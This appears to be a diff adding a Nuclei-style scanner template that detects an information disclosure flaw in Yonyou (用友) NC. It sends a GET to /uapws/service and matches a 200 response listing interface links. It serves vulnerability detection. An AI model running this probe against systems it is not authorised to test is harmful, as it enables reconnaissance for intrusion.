@@ -1,0 +1,28 @@
+http:
+    - matchers:
+        - status:
+            - 200
+          type: status
+        - condition: and
+          part: body
+          type: word
+          words:
+            - <a href="http
+            - /uapws/service
+      matchers-condition: and
+      raw:
+        - |
+          GET /uapws/service HTTP/1.1
+          Host: {{Hostname}}
+id: yonyou-nc-api-disclosure
+info:
+    author: SleepingBag945
+    description: |-
+        用友NC service接口信息泄露漏洞，攻击者可通过构造恶意链接获取所有接口链接
+        app="用友-UFIDA-NC"
+    name: 用友NC service接口信息泄露漏洞
+    reference:
+        - https://mp.weixin.qq.com/s/BgJ2955H0_Ww9XapUzXcDw
+    severity: medium
+    tags:
+        - 用友-ufida
